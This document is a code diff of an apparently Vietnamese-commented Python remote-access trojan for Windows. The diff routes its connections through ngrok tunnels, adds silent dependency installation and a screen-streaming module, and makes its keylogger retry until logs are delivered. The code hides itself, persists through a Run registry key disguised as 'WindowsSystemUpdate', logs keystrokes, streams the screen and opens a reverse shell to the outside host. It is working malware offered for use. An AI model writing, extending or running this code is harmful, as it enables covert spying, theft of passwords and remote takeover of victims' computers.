@@ -6,13 +6,47 @@ import time
 import winreg
 import threading
 
+# --- BƯỚC 1: TỰ ĐỘNG CÀI ĐẶT THƯ VIỆN NGẦM ---
+def auto_install_packages():
+    packages = {
+        "mss": "mss",
+        "opencv-python": "cv2",
+        "numpy": "numpy",
+        "keyboard": "keyboard"
+    }
+    for package, import_name in packages.items():
+        try:
+            __import__(import_name)
+        except ImportError:
+            try:
+                subprocess.check_call(
+                    [sys.executable, "-m", "pip", "install", package, "--quiet", "--no-warn-script-location"],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+            except Exception:
+                pass
+
+auto_install_packages()
+
+import cv2
+import numpy as np
+from mss import mss
+import keyboard
+
 # ==========================================
-# CẤU HÌNH HỆ THỐNG VÀ MẠNG
+# CẤU HÌNH MẠNG QUA NGROK 
 # ==========================================
-SERVER_IP = '192.168.1.139'  # <-- THAY ĐỔI THÀNH IP CỦA MÁY SERVER
-SHELL_PORT = 8080            # Cổng dành cho Remote Shell
-LOG_PORT = 8081              # Cổng dành riêng để gửi dữ liệu Keylogger
-SEND_INTERVAL = 10           # Thời gian gom phím gửi về server (giây)
+SHELL_HOST = '0.tcp.ngrok.io'
+SHELL_PORT = 15234  # <-- Thay số port ngrok cấp cho cổng 8080
+
+LOG_HOST = '0.tcp.ngrok.io'
+LOG_PORT = 18920    # <-- Thay số port ngrok cấp cho cổng 8081
+
+SCREEN_HOST = '0.tcp.ngrok.io'
+SCREEN_PORT = 19451 # <-- Thay số port ngrok cấp cho cổng 8082
+
+SEND_INTERVAL = 10   # Thời gian gom phím gửi về server (giây)
 
 def hide_self():
     """Tự động ẩn file chạy khỏi tầm mắt người dùng trên Windows"""
@@ -29,7 +63,7 @@ def add_to_startup():
         script_path = os.path.abspath(__file__)
         python_executable = sys.executable
         command = f'"{python_executable}" "{script_path}"'
-        
+
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, command)
@@ -38,7 +72,7 @@ def add_to_startup():
         pass
 
 # ==========================================
-# 1. TIẾN TRÌNH KEYLOGGER (BẮT PHÍM & GỬI NGẦM)
+# 1. TIẾN TRÌNH KEYLOGGER BỀN BỈ 24/7 (TỰ GỬI BÙ KHI MẤT MẠNG)
 # ==========================================
 class NetworkKeylogger:
     def __init__(self, interval):
@@ -57,7 +91,7 @@ class NetworkKeylogger:
                 name = "."
             else:
                 name = f"[{name.upper()}]"
-        
+
         with self.lock:
             self.log += name
 
@@ -70,34 +104,40 @@ class NetworkKeylogger:
                 current_log = self.log
                 self.log = ""
 
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((SERVER_IP, LOG_PORT))
-                s.send(current_log.encode('utf-8'))
-                s.close()
-            except Exception:
-                with self.lock:
-                    self.log = current_log + self.log
+            sent = False
+            while not sent:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    s.connect((LOG_HOST, LOG_PORT))
+                    s.send(current_log.encode('utf-8'))
+                    s.close()
+                    sent = True
+                except Exception:
+                    time.sleep(10) # Mất mạng sẽ giữ lại log, đợi 10s gửi lại sau
 
     def start_keylogger(self):
-        try:
-            import keyboard
-            keyboard.on_release(callback=self.callback)
-            t = threading.Thread(target=self.send_logs)
-            t.daemon = True
-            t.start()
-        except Exception:
-            pass
+        def run():
+            try:
+                keyboard.on_release(callback=self.callback)
+                t = threading.Thread(target=self.send_logs, daemon=True)
+                t.start()
+                keyboard.wait()
+            except Exception:
+                time.sleep(10)
+                self.start_keylogger()
+
+        threading.Thread(target=run, daemon=True).start()
 
 # ==========================================
-# 2. TIẾN TRÌNH REMOTE SHELL (ĐIỀU KHIỂN TỪ XA)
+# 2. TIẾN TRÌNH REMOTE SHELL 24/7
 # ==========================================
 def client_shell():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((SERVER_IP, SHELL_PORT))
-            
+            s.connect((SHELL_HOST, SHELL_PORT))
+
             while True:
                 command = s.recv(4096).decode('utf-8', errors='ignore')
                 if not command or command.lower() == "exit":
@@ -125,16 +165,40 @@ def client_shell():
             time.sleep(5)
 
 # ==========================================
+# 3. TIẾN TRÌNH SCREEN STREAMER 24/7
+# ==========================================
+def screen_streamer():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SCREEN_HOST, SCREEN_PORT))
+            with mss() as sct:
+                monitor = sct.monitors[1]
+                while True:
+                    img = sct.grab(monitor)
+                    frame = np.array(img)
+                    frame = cv2.resize(frame, (640, 360))
+                    _, encoded_img = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 65])
+                    
+                    data = encoded_img.tobytes()
+                    size = len(data)
+                    s.sendall(size.to_bytes(4, byteorder='big') + data)
+        except Exception:
+            time.sleep(5)
+
+# ==========================================
 # HÀM KHỞI CHẠY CHÍNH
 # ==========================================
 if __name__ == "__main__":
-    # Kích hoạt các tính năng ẩn danh và duy trì hệ thống
     hide_self()
     add_to_startup()
-    
-    # 1. Chạy Keylogger ngầm trên một luồng riêng
+
+    # 1. Chạy Keylogger ngầm bền bỉ
     keylogger = NetworkKeylogger(interval=SEND_INTERVAL)
     keylogger.start_keylogger()
-    
-    # 2. Chạy vòng lặp Remote Shell ở luồng chính
+
+    # 2. Chạy Screen Streamer trên luồng riêng
+    threading.Thread(target=screen_streamer, daemon=True).start()
+
+    # 3. Chạy vòng lặp Remote Shell ở luồng chính
     client_shell()
